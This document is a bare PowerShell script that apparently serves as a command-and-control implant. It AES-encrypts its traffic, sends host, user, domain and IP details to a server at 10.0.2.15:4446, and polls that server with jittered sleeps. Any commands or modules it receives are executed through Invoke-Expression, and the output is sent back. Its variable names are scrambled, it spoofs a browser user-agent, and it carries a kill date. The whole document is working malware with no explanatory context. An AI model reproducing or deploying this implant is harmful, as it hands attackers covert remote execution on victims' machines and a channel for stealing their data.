$exchange=1
function CAM ($key,$disabled){

$until = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"
$until.Mode = [System.Security.Cryptography.CipherMode]::CBC
$until.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$until.BlockSize = 128
$until.KeySize = 256
if ($disabled)
{
if ($disabled.getType().Name -eq "String")
{$until.IV = [System.Convert]::FromBase64String($disabled)}
else
{$until.IV = $disabled}
}
if ($key)
{
if ($key.getType().Name -eq "String")
{$until.Key = [System.Convert]::FromBase64String($key)}
else
{$until.Key = $key}
}
$until}


function ENC ($key,$nickname,$foo1=0){
if ($foo1 -eq 0){
$compare = [System.Text.Encoding]::UTF8.GetBytes($nickname)}
else{
$compare=$nickname}
$until = CAM $key
$convert = $until.CreateEncryptor()
$verifypeer = $convert.TransformFinalBlock($compare, 0, $compare.Length)
[byte[]] $heading = $until.IV + $verifypeer
[System.Convert]::ToBase64String($heading)
}


function DEC ($key,$analyze,$foo1=0){
$compare = [System.Convert]::FromBase64String($analyze)
$disabled = $compare[0..15]
$until = CAM $key $disabled
$d = $until.CreateDecryptor()
$u = $d.TransformFinalBlock($compare, 16, $compare.Length - 16)
if ($foo1 -eq 0){
[System.Text.Encoding]::UTF8.GetString($u)
}
else{
return $u}
}



function load($USER)
      {

            $pgtId = enc -key $key -nickname $USER

            $spammed = new-object net.WebClient
            $spammed.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
            $spammed.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")

            try{
              $password1 = @{topicid=$storage;trigger=$pgtId}
                $sortorder=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri https://10.0.2.15:4446/disco -Method POST -Body $password1
		$sortorder=$sortorder.Content
            }
            catch{
                $password1 = "topicid=$storage&trigger=$pgtId"
                $spammed = new-object net.WebClient
                $spammed.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
                $spammed.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
                $sortorder=$spammed.UploadString("https://10.0.2.15:4446/disco",$password1)
                }


            $modulecontent=dec -key $key -analyze $sortorder


      return $modulecontent
      }

$deletecomment = $env:COMPUTERNAME;
if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ $bookmark="*"}
$wait = $env:USERNAME;
$wait ="$bookmark$wait"
$sesskey = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$fileid = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($sesskey)";
$sure = (Get-WmiObject Win32_ComputerSystem).Domain;
$submit1=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
$Artist = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$storage="$Artist-img.jpeg"

$reg="trigger=$fileid**$submit1**$sesskey**$deletecomment**$sure**$wait**$pid&$Artist=$storage"
$spammed = new-object net.WebClient
      $spammed.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $spammed.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=$spammed.UploadString("https://10.0.2.15:4446/inquire",$reg)
$preset = 'silentlyContinue';

$spammed = New-Object system.Net.WebClient;
$windows=$storage
while($true){
$model=[int](Get-Date -UFormat "%s")%97
$Message=Get-Random -Minimum 50 -Maximum 250 -SetSeed $model
$allow=-join ((65..90)*500 + (97..122)*500 | Get-Random -Count $Message | % {[char]$_});


try{
    $password1 = @{topicid=$storage;token=$allow}
$analyze=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri https://10.0.2.15:4446/ServiceDefinition -Method POST -Body $password1
$analyze=$analyze.Content
}
 catch{
$password1="topicid=$storage&token=$allow"
        $spammed = new-object net.WebClient
      $spammed.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $spammed.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $analyze=$spammed.UploadString("https://10.0.2.15:4446/ServiceDefinition",$password1)
        }



if($analyze -eq "REGISTER"){
$spammed = new-object net.WebClient
      $spammed.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $spammed.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=$spammed.UploadString("https://10.0.2.15:4446/inquire",$reg)
$preset = 'silentlyContinue';
continue
}
$reg=echo $analyze | select-string -Pattern "\-\*\-\*\-\*"
if($reg)
#$analyze -eq "-")
{
$model=[int](Get-Date -UFormat "%s")
$rem=[int]$exchange/2+1
$compress=[int]$exchange+1
$exchange=Get-Random -Minimum $rem -Maximum $compress -SetSeed $model
sleep $exchange
$dbstats = (Get-Date -Format "dd/MM/yyyy")
$dbstats = [datetime]::ParseExact($dbstats,"dd/MM/yyyy",$null)
$param2 = [datetime]::ParseExact("24/03/2022","dd/MM/yyyy",$null)
if ($param2 -lt $dbstats) {kill $pid}
}
else{
$jsoncallback=dec -key $key -analyze $analyze



if($jsoncallback.split(" ")[0] -eq "load"){
$verifypeer=$jsoncallback.split(" ")[1]
$USER=load -USER $verifypeer
try{
$core=Invoke-Expression ($USER) -ErrorVariable z | Out-String
        }
        catch{
        $core = $Error[0] | Out-String;
        }
        if ($core.Length -eq 0){
        $core="$core$z"
        }


}
else{
try{
$core=Invoke-Expression ($jsoncallback) -ErrorVariable z | Out-String
        }
        catch{
        $core = $Error[0] | Out-String;
        }
        if ($core.Length -eq 0){
        $core="$core$z"
        }}

  if ($core.Length -eq 0){
$core="$core$z"
}

$rows=enc -key $key -nickname $core






 try{
      $password1 = @{topicid=$storage;trigger=$rows}
$stylesheet=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri https://10.0.2.15:4446/inspection -Method POST -Body $password1
}
 catch{
 $password1 = "topicid=$storage&trigger=$rows"
        $spammed = new-object net.WebClient
      $spammed.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $spammed.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $stylesheet=$spammed.UploadString("https://10.0.2.15:4446/inspection","POST",$password1)
        }

$stylesheet=" "
$core=" "
}
}
